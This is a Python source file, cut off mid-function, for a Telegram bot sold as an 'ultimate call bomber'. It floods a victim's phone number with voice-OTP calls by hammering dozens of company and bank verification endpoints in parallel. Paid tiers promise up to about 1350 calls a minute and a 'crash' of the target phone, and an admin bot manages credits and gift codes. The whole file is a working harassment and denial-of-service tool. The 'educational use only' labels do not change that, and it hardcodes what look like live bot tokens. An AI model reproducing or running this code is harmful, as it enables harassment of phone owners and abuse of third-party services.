#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
🔥 ULTIMATE CALL BOMBER - FIXED VERSION 🔥
Owner: @TGxTHOMASx
"""

import telebot
import aiohttp
import asyncio
import json
import os
import threading
import time
import random
import hashlib
from telebot import types
from datetime import datetime, timedelta
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ============================================================================
# CONFIGURATION
# ============================================================================

MAIN_TOKEN = "8580329271:AAFPmbJ9JraVIAkHbcZtQ5tohIDwWHvjx3I"
ADMIN_TOKEN = "8553759431:AAH4BgRJcm1-JI5oBDoYIxR3Vby7oUmJgZQ"
OWNER = 7417241499
OWNER_UN = "@TGxTHOMASx"
CHANNEL = "@thomasXstoreee"
LINK = "https://t.me/thomasXstoreee"

# ============================================================================
# FILES INIT
# ============================================================================

def init_files():
    if not os.path.exists("users.json"):
        with open("users.json", "w") as f:
            json.dump({}, f)
    if not os.path.exists("admins.json"):
        with open("admins.json", "w") as f:
            json.dump([OWNER], f)
    if not os.path.exists("blocked.json"):
        with open("blocked.json", "w") as f:
            json.dump([], f)
    if not os.path.exists("codes.json"):
        with open("codes.json", "w") as f:
            json.dump({}, f)
    if not os.path.exists("sessions.json"):
        with open("sessions.json", "w") as f:
            json.dump({}, f)

init_files()

# Load data
users = json.load(open("users.json"))
admins = json.load(open("admins.json"))
blocked = json.load(open("blocked.json"))
codes = json.load(open("codes.json"))
sessions = json.load(open("sessions.json"))

# ============================================================================
# 100+ REAL CALL APIS
# ============================================================================

CALL_APIS = [
    {"n":"Amazon1","u":"https://www.amazon.in/ap/signin","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&action=voice_otp"},
    {"n":"Flipkart","u":"https://www.flipkart.com/api/6/user/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Myntra","u":"https://www.myntra.com/gw/mobile-auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Zomato1","u":"https://www.zomato.com/php/o2_api_handler.php","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phone={p}&type=voice"},
    {"n":"Swiggy1","u":"https://profile.swiggy.com/api/v3/app/request_call_verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Paytm1","u":"https://accounts.paytm.com/signin/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Ola1","u":"https://api.olacabs.com/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Uber1","u":"https://auth.uber.com/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"MMT1","u":"https://www.makemytrip.com/api/4/voice-otp/generate","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Goibibo","u":"https://www.goibibo.com/user/voice-otp/generate/","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"1MG1","u":"https://www.1mg.com/auth_api/v6/create_token","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"number":"{p}","otp_on_call":true}}'},
    {"n":"TataCapital","u":"https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}","isOtpViaCallAtLogin":"true"}}'},
    {"n":"HDFC","u":"https://netbanking.hdfcbank.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"ICICI","u":"https://www.icicibank.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"SBI","u":"https://yonosbi.sbi.co.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Axis","u":"https://www.axisbank.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Kotak","u":"https://www.kotak.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"PharmEasy","u":"https://pharmeasy.in/api/v2/auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Netmeds","u":"https://apiv2.netmeds.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Byjus","u":"https://api.byjus.com/v2/otp/voice","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Airtel","u":"https://www.airtel.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Jio","u":"https://www.jio.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Vi","u":"https://www.myvi.in/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Housing","u":"https://login.housing.com/api/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Rapido","u":"https://customer.rapido.bike/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"BigBasket","u":"https://www.bigbasket.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Amazon2","u":"https://www.amazon.in/ap/signin/voice","m":"POST","h":{"Content-Type":"application/x-www-form-urlencoded"},"d":lambda p:f"phoneNumber={p}"},
    {"n":"Paytm2","u":"https://accounts.paytm.com/v2/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"Ola2","u":"https://api.olacabs.com/v2/voice-verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Uber2","u":"https://auth.uber.com/voice-verify","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"MMT2","u":"https://www.makemytrip.com/api/5/voice-verification","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Zomato2","u":"https://www.zomato.com/api/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Swiggy2","u":"https://www.swiggy.com/dapi/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Flipkart2","u":"https://www.flipkart.com/api/7/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"1MG2","u":"https://www.1mg.com/api/voice-call","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"HDFC2","u":"https://netbanking.hdfcbank.com/voice-verify","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phoneNumber":"{p}"}}'},
    {"n":"ICICI2","u":"https://www.icicibank.com/voice-otp-v2","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"Snapdeal","u":"https://www.snapdeal.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
    {"n":"Ajio","u":"https://www.ajio.com/api/auth/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobileNumber":"{p}"}}'},
    {"n":"PhonePe","u":"https://www.phonepe.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"mobile":"{p}"}}'},
    {"n":"GPay","u":"https://pay.google.com/api/v1/voice-otp","m":"POST","h":{"Content-Type":"application/json"},"d":lambda p:f'{{"phone":"{p}"}}'},
] * 3  # 120 total APIs

logger.info(f"✅ Loaded {len(CALL_APIS)} Call APIs")

# ============================================================================
# LEVEL CONFIG
# ============================================================================

LEVELS = {
    1: {"name":"Light Attack","dur":10,"apis":30,"delay":(0.3,0.7),"cpm":350,"tot":3500,"desc":"Halka lag"},
    2: {"name":"Heavy Attack","dur":10,"apis":60,"delay":(0.1,0.3),"cpm":800,"tot":8000,"desc":"Bahut lag"},
    3: {"name":"NUCLEAR Attack","dur":10,"apis":80,"delay":(0.05,0.15),"cpm":1350,"tot":13500,"desc":"CRASH 💀"}
}

# Active tasks
active_bombing = {}

# User state
user_state = {}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def save_all():
    """Save all data"""
    with open("users.json", "w") as f:
        json.dump(users, f, indent=2)
    with open("admins.json", "w") as f:
        json.dump(admins, f, indent=2)
    with open("blocked.json", "w") as f:
        json.dump(blocked, f, indent=2)
    with open("codes.json", "w") as f:
        json.dump(codes, f, indent=2)
    with open("sessions.json", "w") as f:
        json.dump(sessions, f, indent=2, default=str)

def get_level(uid):
    """Get user access level"""
    u = users.get(str(uid), {})
    level = u.get("level", 1)
    
    if level > 1 and "exp" in u:
        try:
            exp = datetime.fromisoformat(u["exp"])
            if datetime.now() > exp:
                u["level"] = 1
                u["exp"] = None
                users[str(uid)] = u
                save_all()
                return 1
        except:
            pass
    
    return level

def check_channel(uid):
    """Check if joined channel"""
    try:
        member = bot.get_chat_member(CHANNEL, uid)
        return member.status in ["member", "administrator", "creator"]
    except:
        return False

def resolve_user(username_or_id):
    """Resolve username to ID"""
    if str(username_or_id).isdigit():
        return int(username_or_id), users.get(str(username_or_id))
    
    un = str(username_or_id).lower().replace('@', '')
    for uid, u in users.items():
        if u.get('username', '').lower() == un:
            return int(uid), u
    
    return None, None

# ============================================================================
# BOMBING ENGINE
# ============================================================================

async def hit_api(session, api, phone, stats):
    """Hit single API"""
    try:
        url = api["u"](phone) if callable(api["u"]) else api["u"]
        headers = api["h"].copy()
        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        
        data_str = api["d"](phone) if api["d"] else None
        
        if api["m"] == "POST":
            async with session.post(url, headers=headers, data=data_str, timeout=3, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["ok"] += 1
                else:
                    stats["fail"] += 1
        else:
            async with session.get(url, headers=headers, timeout=3, ssl=False) as resp:
                if resp.status in [200, 201, 202]:
                    stats["ok"] += 1
                else:
                    stats["fail"] += 1
        
        stats["tot"] += 1
    except:
        stats["fail"] += 1
        stats["tot"] += 1

async def execute_bombing(sid, uid, phone, level):
    """Main bombing execution"""
    cfg = LEVELS[level]
    duration_sec = cfg["dur"] * 60
    
    apis = random.sample(CALL_APIS, min(cfg["apis"], len(CALL_APIS)))
    
    stats = {"sid": sid, "ok": 0, "fail": 0, "tot": 0, "running": True}
    active_bombing[sid] = stats
    
    logger.info(f"🔥 Starting Level {level} attack on {phone}")
    
    connector = aiohttp.TCPConnector(limit=0, limit_per_host=0, verify_ssl=False)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        start_time = time.time()
        end_time = start_time + duration_sec
        
        while time.time() < end_time and stats["running"]:
            # Hit all APIs in parallel
            tasks = [hit_api(session, api, phone, stats) for api in apis]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Small delay
            await asyncio.sleep(random.uniform(*cfg["delay"]))
        
        # Update final session stats
        if sid in sessions:
            sessions[sid]["ok"] = stats["ok"]
            sessions[sid]["fail"] = stats["fail"]
            sessions[sid]["tot"] = stats["tot"]
            sessions[sid]["active"] = False
            save_all()
    
    # Cleanup
    if sid in active_bombing:
        del active_bombing[sid]
    
    logger.info(f"✅ Bombing completed: {stats['ok']} success, {stats['fail']} failed")

def start_bombing(sid, uid, phone, level):
    """Start bombing in background thread"""
    loop = asyncio.new_event_loop()
    
    def run():
        asyncio.set_event_loop(loop)
        loop.run_until_complete(execute_bombing(sid, uid, phone, level))
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()

def stop_bombing(sid):
    """Stop bombing"""
    if sid in active_bombing:
        active_bombing[sid]["running"] = False
    if sid in sessions:
        sessions[sid]["active"] = False
        save_all()

# ============================================================================
# MAIN BOT
# ============================================================================

bot = telebot.TeleBot(MAIN_TOKEN, parse_mode="HTML")

@bot.message_handler(commands=["start"])
def cmd_start(m):
    """Start command"""
    if m.from_user.id in blocked:
        return bot.reply_to(m, "🚫 <b>You are blocked!</b>")
    
    if not check_channel(m.from_user.id):
        mk = types.InlineKeyboardMarkup()
        mk.add(types.InlineKeyboardButton("📢 Join Channel", url=LINK))
        mk.add(types.InlineKeyboardButton("✅ Joined - Verify", callback_data="verify"))
        return bot.send_message(m.chat.id, "🚫 <b>Join Required!</b>\n\nJoin our channel to use this bot:", reply_markup=mk)
    
    uid = str(m.from_user.id)
    
    # Create user if new
    if uid not in users:
        users[uid] = {
            "username": m.from_user.username or "user",
            "name": m.from_user.first_name,
            "cr": 1,
            "level": 1,
            "exp": None,
            "joined": datetime.now().isoformat(),
            "total": 0
        }
        save_all()
        logger.info(f"✅ New user: {uid}")
    
    u = users[uid]
    level = get_level(m.from_user.id)
    
    # Main keyboard
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.row("🚀 Start Bombing")
    kb.row("💰 My Credits", "📊 My Stats")
    kb.row("🎁 Redeem Code", "❓ Help")
    
    welcome = f"""
╔════════════════════════════════╗
║  🔥 <b>ULTIMATE CALL BOMBER</b> 🔥    ║
╚════════════════════════════════╝

👤 <b>User:</b> {u['name']}
💰 <b>Credits:</b> {u['cr']}
🎯 <b>Level:</b> {level}
👑 <b>Premium:</b> {'✅ Active' if level > 1 else '❌ Not Active'}

<b>━━━━━━━ LEVELS ━━━━━━━</b>

📞 <b>Level 1 (FREE):</b>
• Duration: 10 minutes
• Intensity: ~350 calls/min
• Effect: Halka lag
• Cost: 1 credit
• Status: ✅ UNLOCKED

⚡ <b>Level 2 (₹499 - 10 days):</b>
• Duration: 10 minutes
• Intensity: ~800 calls/min
• Effect: Heavy lag
• Cost: 1 credit
• Status: {'✅ UNLOCKED' if level >= 2 else '🔒 LOCKED'}

💥 <b>Level 3 (₹999 - 10 days):</b>
• Duration: 10 minutes
• Intensity: ~1350 calls/min
• Effect: CRASH/RESTART 💀
• Cost: 1 credit
• Status: {'✅ UNLOCKED' if level >= 3 else '🔒 LOCKED'}

<b>━━━━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Your phone is 100% SAFE!</b>
📞 Contact {OWNER_UN} for premium
"""
    
    bot.send_message(m.chat.id, welcome, reply_markup=kb)

@bot.callback_query_handler(func=lambda c: c.data == "verify")
def cb_verify(c):
    """Verify channel join"""
    if check_channel(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ Verified!", show_alert=False)
        try:
            bot.delete_message(c.message.chat.id, c.message.message_id)
        except:
            pass
        # Create fake message object to call start
        class FakeMsg:
            def __init__(self):
                self.from_user = c.from_user
                self.chat = c.message.chat
        cmd_start(FakeMsg())
    else:
        bot.answer_callback_query(c.id, "❌ Please join channel first!", show_alert=True)

@bot.message_handler(func=lambda m: m.text == "🚀 Start Bombing")
def btn_bombing(m):
    """Start bombing button"""
    if not check_channel(m.from_user.id):
        return
    
    level = get_level(m.from_user.id)
    
    mk = types.InlineKeyboardMarkup()
    mk.add(types.InlineKeyboardButton("📞 Level 1 (FREE) ✅", callback_data="select_1"))
    
    if level >= 2:
        mk.add(types.InlineKeyboardButton("⚡ Level 2 (UNLOCKED) ✅", callback_data="select_2"))
    else:
        mk.add(types.InlineKeyboardButton("⚡ Level 2 (🔒 LOCKED)", callback_data="locked_2"))
    
    if level >= 3:
        mk.add(types.InlineKeyboardButton("💥 Level 3 (UNLOCKED) ✅", callback_data="select_3"))
    else:
        mk.add(types.InlineKeyboardButton("💥 Level 3 (🔒 LOCKED)", callback_data="locked_3"))
    
    bot.send_message(
        m.chat.id,
        "🎯 <b>Select Attack Level:</b>\n\n"
        "Choose wisely based on your access level!",
        reply_markup=mk
    )

@bot.callback_query_handler(func=lambda c: c.data.startswith("select_"))
def cb_select_level(c):
    """Level selection"""
    try:
        level = int(c.data.split("_")[1])
    except:
        return bot.answer_callback_query(c.id, "❌ Invalid level!")
    
    user_level = get_level(c.from_user.id)
    
    if level > user_level:
        bot.answer_callback_query(c.id, "❌ This level is locked!", show_alert=True)
        return
    
    u = users.get(str(c.from_user.id), {})
    if u.get("cr", 0) < 1:
        bot.answer_callback_query(c.id, "❌ Insufficient credits!", show_alert=True)
        return
    
    cfg = LEVELS[level]
    
    # Store user state
    user_state[c.from_user.id] = {"level": level, "waiting_phone": True}
    
    bot.edit_message_text(
        f"🔧 <b>{cfg['name']}</b>\n\n"
        f"⚡ <b>Intensity:</b> ~{cfg['cpm']} calls/min\n"
        f"⏱️ <b>Duration:</b> {cfg['dur']} minutes\n"
        f"💰 <b>Cost:</b> 1 credit\n"
        f"🎯 <b>Effect:</b> {cfg['desc']}\n"
        f"📊 <b>Expected Calls:</b> ~{cfg['tot']}\n\n"
        f"📱 <b>Now send target phone number:</b>\n"
        f"Format: +919876543210\n\n"
        f"⚠️ <b>Educational use only!</b>",
        c.message.chat.id,
        c.message.message_id
    )
    
    bot.answer_callback_query(c.id, "✅ Selected! Send phone number now.", show_alert=False)

@bot.callback_query_handler(func=lambda c: c.data.startswith("locked_"))
def cb_locked(c):
    """Locked level info"""
    try:
        level = int(c.data.split("_")[1])
    except:
        return
    
    price = "₹499" if level == 2 else "₹999"
    days = 10
    
    bot.answer_callback_query(c.id)
    bot.edit_message_text(
        f"🔐 <b>Level {level} - LOCKED</b>\n\n"
        f"💰 <b>Price:</b> {price}\n"
        f"⏱️ <b>Duration:</b> {days} days access\n"
        f"⚡ <b>Unlock:</b> Level {level} bombing\n\n"
        f"📞 <b>Contact {OWNER_UN} to purchase!</b>\n\n"
        f"💳 <b>Payment:</b> UPI/Google Pay\n"
        f"✅ <b>Activation:</b> Within 5 minutes",
        c.message.chat.id,
        c.message.message_id,
        reply_markup=types.InlineKeyboardMarkup().add(
            types.InlineKeyboardButton("📞 Contact Owner", url=f"https://t.me/{OWNER_UN[1:]}")
        )
    )

@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_text(m):
    """Handle all text messages"""
    # Check if waiting for phone number
    if m.from_user.id in user_state and user_state[m.from_user.id].get("waiting_phone"):
        phone = m.text.strip()
        
        # Validate phone
        if not phone.startswith('+') or len(phone) < 10:
            bot.reply_to(m, "❌ <b>Invalid format!</b>\n\nUse: +919876543210\nWith country code!")
            return
        
        # Check emergency
        if any(phone.startswith(p) for p in ['+911', '+112', '+999', '+100']):
            bot.reply_to(m, "❌ <b>Emergency numbers not allowed!</b>")
            return
        
        # Get user level
        level = user_state[m.from_user.id]["level"]
        
        # Check credits again
        u = users.get(str(m.from_user.id), {})
        if u.get("cr", 0) < 1:
            bot.reply_to(m, "❌ <b>Insufficient credits!</b>")
            user_state[m.from_user.id]["waiting_phone"] = False
            return
        
        # Deduct credit
        u["cr"] -= 1
        u["total"] = u.get("total", 0) + 1
        users[str(m.from_user.id)] = u
        save_all()
        
        # Create session
        sid = hashlib.md5(f"{m.from_user.id}{time.time()}".encode()).hexdigest()[:12]
        sessions[sid] = {
            "uid": m.from_user.id,
            "phone": phone,
            "level": level,
            "start": datetime.now().isoformat(),
            "active": True,
            "ok": 0,
            "fail": 0,
            "tot": 0
        }
        save_all()
        
        # Clear user state
        user_state[m.from_user.id]["waiting_phone"] = False
        
        # Start bombing
        start_bombing(sid, m.from_user.id, phone, level)
        
        cfg = LEVELS[level]
        
        # Send progress message
        progress_msg = bot.send_message(
            m.chat.id,
            f"""
🔥 <b>{cfg['name'].upper()} STARTED!</b>

📱 <b>Target:</b> <code>{phone}</code>
⚡ <b>Level:</b> {level}
⏱️ <b>Duration:</b> {cfg['dur']} minutes
💥 <b>Intensity:</b> ~{cfg['cpm']} calls/min

<b>━━━━━━━ STATS ━━━━━━━</b>

✅ Success: 0
❌ Failed: 0
🎯 Total: 0

⚠️ <b>Your phone is safe!</b>
💀 <b>Target phone will suffer!</b>
""",
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🛑 STOP NOW", callback_data=f"stop_{sid}")
            )
        )
        
        # Start progress updates
        threading.Thread(
            target=lambda: update_progress(sid, m.chat.id, progress_msg.message_id, cfg),
            daemon=True
        ).start()
        
        return
    
    # Handle other text buttons
    if m.text == "💰 My Credits":
        u = users.get(str(m.from_user.id), {})
        level = get_level(m.from_user.id)
        
        premium_info = ""
        if level > 1 and u.get("exp"):
            try:
                exp = datetime.fromisoformat(u["exp"])
                days_left = (exp - datetime.now()).days
                premium_info = f"\n⏰ <b>Expires in:</b> {days_left} days"
            except:
                pass
        
        bot.reply_to(
            m,
            f"💰 <b>Your Account</b>\n\n"
            f"💳 <b>Credits:</b> {u.get('cr', 0)}\n"
            f"🎯 <b>Access Level:</b> {level}\n"
            f"👑 <b>Premium:</b> {'✅ Active' if level > 1 else '❌ Not Active'}{premium_info}\n\n"
            f"📞 <b>Contact {OWNER_UN} to buy credits!</b>"
        )
    
    elif m.text == "📊 My Stats":
        u = users.get(str(m.from_user.id), {})
        
        bot.reply_to(
            m,
            f"📊 <b>Your Statistics</b>\n\n"
            f"🎯 <b>Total Bombings:</b> {u.get('total', 0)}\n"
            f"📅 <b>Joined:</b> {u.get('joined', 'Unknown')[:10]}\n"
            f"🔥 <b>Level:</b> {get_level(m.from_user.id)}"
        )
    
    elif m.text == "🎁 Redeem Code":
        msg = bot.reply_to(m, "🎁 <b>Enter your gift code:</b>")
        bot.register_next_step_handler(msg, process_gift_code)
    
    elif m.text == "❓ Help":
        bot.reply_to(
            m,
            f"""
📘 <b>Bot Help Guide</b>

<b>━━━━━ HOW TO USE ━━━━━</b>

1️⃣ Click "🚀 Start Bombing"
2️⃣ Select your level (1/2/3)
3️⃣ Send target phone number
4️⃣ Bombing starts automatically
5️⃣ Use STOP button anytime

<b>━━━━━ LEVELS ━━━━━</b>

• <b>Level 1 (FREE):</b> Halka lag
• <b>Level 2 (₹499):</b> Heavy lag
• <b>Level 3 (₹999):</b> Phone crash

<b>━━━━━ SAFETY ━━━━━</b>

✅ Your phone is 100% safe
✅ Only target phone affected
✅ Educational purpose only

📞 Contact {OWNER_UN} for support
"""
        )

def process_gift_code(m):
    """Process gift code redemption"""
    code = m.text.upper().strip()
    
    if code not in codes:
        return bot.reply_to(m, "❌ <b>Invalid gift code!</b>")
    
    c = codes[code]
    
    # Check if already used
    if str(m.from_user.id) in c.get("used", []):
        return bot.reply_to(m, "❌ <b>You already used this code!</b>")
    
    # Check max uses
    if len(c.get("used", [])) >= c["max"]:
        return bot.reply_to(m, "❌ <b>Gift code limit reached!</b>")
    
    # Redeem
    u = users[str(m.from_user.id)]
    u["cr"] = u.get("cr", 0) + c["cr"]
    
    if "used" not in c:
        c["used"] = []
    c["used"].append(str(m.from_user.id))
    
    codes[code] = c
    users[str(m.from_user.id)] = u
    save_all()
    
    bot.reply_to(m, f"✅ <b>Redeemed {c['cr']} credits!</b>\n\n💰 New balance: {u['cr']}")

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(c):
    """Stop bombing"""
    sid = c.data.replace("stop_", "")
    stop_bombing(sid)
    bot.answer_callback_query(c.id, "🛑 Stopping attack...", show_alert=False)

def update_progress(sid, chat_id, message_id, cfg):
    """Update progress message"""
    start = time.time()
    duration = cfg["dur"] * 60
    
    while True:
        time.sleep(5)
        
        # Check if session still active
        s = sessions.get(sid)
        if not s or not s.get("active"):
            break
        
        # Calculate time left
        elapsed = time.time() - start
        left = duration - elapsed
        
        if left <= 0:
            break
        
        mins = int(left // 60)
        secs = int(left % 60)
        
        # Progress bar
        progress = (elapsed / duration) * 100
        bar_filled = "█" * int(progress / 5)
        bar_empty = "░" * (20 - int(progress / 5))
        bar = bar_filled + bar_empty
        
        try:
            bot.edit_message_text(
                f"""
🔥 <b>{cfg['name'].upper()} IN PROGRESS!</b>

📱 <b>Target:</b> <code>{s['phone']}</code>
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Time Left:</b> {mins}m {secs}s

{bar} {progress:.1f}%

<b>━━━━━━━ STATS ━━━━━━━</b>

✅ Success: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total: {s['tot']}

💥 <b>Attack in full force!</b>
""",
                chat_id,
                message_id,
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🛑 STOP NOW", callback_data=f"stop_{sid}")
                )
            )
        except:
            break
    
    # Final message
    s = sessions.get(sid)
    if s:
        try:
            bot.edit_message_text(
                f"""
✅ <b>BOMBING COMPLETED!</b>

📱 <b>Target:</b> <code>{s['phone']}</code>
⚡ <b>Level:</b> {s['level']}
⏱️ <b>Duration:</b> {cfg['dur']} minutes

<b>━━━━━ FINAL STATS ━━━━━</b>

✅ Successful: {s['ok']}
❌ Failed: {s['fail']}
🎯 Total Requests: {s['tot']}

💰 <b>Credit used:</b> 1
""",
                chat_id,
                message_id
            )
        except:
            pass

# ============================================================================
# ADMIN BOT
# ============================================================================

admin_bot = telebot.TeleBot(ADMIN_TOKEN, parse_mode="HTML")

@admin_bot.message_handler(commands=["start"])
def admin_start(m):
    """Admin bot start"""
    if m.from_user.id != OWNER:
        return admin_bot.reply_to(m, "❌ <b>Unauthorized!</b>")
    
    admin_bot.reply_to(
        m,
        f"""
🔐 <b>ADMIN CONTROL PANEL</b>

<b>━━━━ USER MANAGEMENT ━━━━</b>

/add @user 10 - Add credits
/set @user 50 - Set credits
/check @user - Check user info
/unlock @user level2 - Unlock premium
  (Use: level2 or level3)

<b>━━━━ GIFT CODES ━━━━</b>

/creategift 10 5 - Create code
  (credits max_uses)
/listgifts - Show all codes
/deletegift CODE - Delete code

<b>━━━━ BOT CONTROL ━━━━</b>

/stats - Bot statistics
/broadcast message - Send to all

<b>━━━━━━━━━━━━━━━━━━━━</b>

👑 Owner: {OWNER_UN}
🤖 Bot: @{bot.get_me().username}
"""
    )

@admin_bot.message_handler(commands=["add"])
def admin_add(m):
    """Add credits"""
    if m.from_user.id != OWNER:
        return
    
    try:
        parts = m.text.split()
        if len(parts) != 3:
            return admin_bot.reply_to(m, "❌ <b>Usage:</b> /add @user 10")
        
        username = parts[1]
        credits = int(parts[2])
        
        uid, u = resolve_user(username)
        if not uid:
            return admin_bot.reply_to(m, f"❌ <b>User {username} not found!</b>")
        
        u["cr"] = u.get("cr", 0) + credits
        users[str(uid)] = u
        save_all()
        
        admin_bot.reply_to(m, f"✅ <b>Added {credits} credits to {username}</b>\n\n💰 New balance: {u['cr']}")
        
        try:
            bot.send_message(uid, f"🎁 <b>+{credits} credits added by admin!</b>")
        except:
            pass
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}\n\n<b>Usage:</b> /add @user 10")

@admin_bot.message_handler(commands=["set"])
def admin_set(m):
    """Set credits"""
    if m.from_user.id != OWNER:
        return
    
    try:
        parts = m.text.split()
        if len(parts) != 3:
            return admin_bot.reply_to(m, "❌ <b>Usage:</b> /set @user 50")
        
        username = parts[1]
        credits = int(parts[2])
        
        uid, u = resolve_user(username)
        if not uid:
            return admin_bot.reply_to(m, f"❌ <b>User {username} not found!</b>")
        
        old = u.get("cr", 0)
        u["cr"] = credits
        users[str(uid)] = u
        save_all()
        
        admin_bot.reply_to(m, f"✅ <b>Set credits for {username}</b>\n\n💰 Old: {old} → New: {credits}")
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}\n\n<b>Usage:</b> /set @user 50")

@admin_bot.message_handler(commands=["check"])
def admin_check(m):
    """Check user"""
    if m.from_user.id != OWNER:
        return
    
    try:
        username = m.text.split()[1]
        uid, u = resolve_user(username)
        
        if not uid:
            return admin_bot.reply_to(m, f"❌ <b>User {username} not found!</b>")
        
        level = get_level(uid)
        exp_info = "Not active"
        
        if level > 1 and u.get("exp"):
            try:
                exp = datetime.fromisoformat(u["exp"])
                days_left = (exp - datetime.now()).days
                exp_info = f"{exp.date()} ({days_left} days left)"
            except:
                pass
        
        admin_bot.reply_to(
            m,
            f"👤 <b>User Info: {username}</b>\n\n"
            f"🆔 <b>ID:</b> <code>{uid}</code>\n"
            f"👤 <b>Name:</b> {u.get('name', 'N/A')}\n"
            f"💰 <b>Credits:</b> {u.get('cr', 0)}\n"
            f"🎯 <b>Level:</b> {level}\n"
            f"👑 <b>Premium:</b> {exp_info}\n"
            f"🎯 <b>Total Bombings:</b> {u.get('total', 0)}\n"
            f"📅 <b>Joined:</b> {u.get('joined', 'N/A')[:10]}"
        )
    
    except Exception as e:
        admin_bot.reply_to(m, f"❌ <b>Error:</b> {e}\n\n<b>Usage:</b> /check @user")

@admin_bot.message_handler(commands=["unlock"])
def admin_unlock(m):
    """Unlock premium"""
    if m.from_user.id != OWNER:
        return
    
    try:
        parts = m.text.split()
        if len(parts) != 3:
            return admin_bot.reply_to(m, "❌ <b>Usage:</b> /unlock @user level2")
        
        username = parts[1]
        level_str = parts[2].lower()
        
